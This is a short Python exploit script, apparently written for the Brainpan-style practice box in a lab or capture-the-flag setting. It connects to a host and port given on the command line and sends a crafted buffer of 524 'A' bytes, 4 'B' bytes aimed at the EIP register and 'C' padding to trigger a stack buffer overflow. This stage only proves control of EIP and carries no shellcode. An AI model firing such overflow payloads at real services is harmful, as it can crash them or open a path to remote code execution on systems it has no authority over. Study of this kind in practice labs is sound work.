#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# exp for brainpain

import sys
from time import sleep
import socket

# bsize = int(sys.argv[3])

def attack(dst, dst_port, data):
    try:
        socks = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        socks.connect((dst, dst_port))
        conn = socks.recv(1024)
        # print(conn)

        dd = data.encode('utf-8')
        socks.send(dd)
        print("Sending buffer: {}".format(dd))
        # print(conn)
    except socket.error as err:
        print("Socket connect failed! {}".format(err))
    finally:
        sleep(0.5)
        socks.close()

if __name__ == '__main__':

    # buffer create python -c 'print("A"*100)'
    # control esp

    junk = 'A'* 524 # ebp fill with 524 bytes 41414141
    eip = 'B' * 4   # eip register will be fill with B 42424242
    block = 'C' * (1000 - 524 - 4) # esp will be fill with C block 43434343
    buff = junk + eip + block

    host = str(sys.argv[1])
    port = int(sys.argv[2])

    attack(host, port, buff)
